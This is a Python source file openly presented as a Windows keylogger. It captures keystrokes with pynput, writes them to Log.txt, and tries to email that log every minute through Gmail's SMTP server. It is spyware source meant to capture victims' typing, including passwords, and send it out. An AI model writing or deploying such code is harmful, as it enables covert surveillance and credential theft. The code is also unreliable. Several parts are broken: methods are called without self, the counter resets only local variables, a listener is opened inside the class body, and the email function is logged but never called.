
# KeyLogger For Windows
# Created By: Leo Power


import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.message import EmailMessage
import time
import sys
import time
import threading
import logging



def Send_Email():
    

    EMAIL_ADDRESS = ""
    EMAIL_PASSWORD = ""

    msg = EmailMessage()
    msg['Subject'] = 'PYTHON'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg.set_content('Key Logger')


    with open('Log.txt', 'rb') as f:
        file_data = f.read()
        file_type = 'txt'
        file_name = f.name
    
    msg.add_attachment(file_data, maintype='text', subtype=file_type, filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        smtp.send_message(msg)


class KEY_LOG:
    count = 0
    keys = []

    def on_press(self, key):

        self.keys.append(key)
        self.count += 1
        print("{0} pressed".format(key))

        if self.count >= 10:
            count = 0
            write_file(self.keys)
            keys = []

    def write_file(self, keys):
        with open("Log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(self, key):
        if key == Key.esc:
            return False
            
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()




def thread_function(self, name):
    logging.info("")
    while True:
      logging.info("")
      time.sleep(60)
      logging.info(Send_Email)


logging.basicConfig(level=logging.INFO)

logging.info("Main    : before creating thread")

x = threading.Thread(target=thread_function, args=(1,))

logging.info("Main    : before running thread")

x.start()
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
time.sleep(125)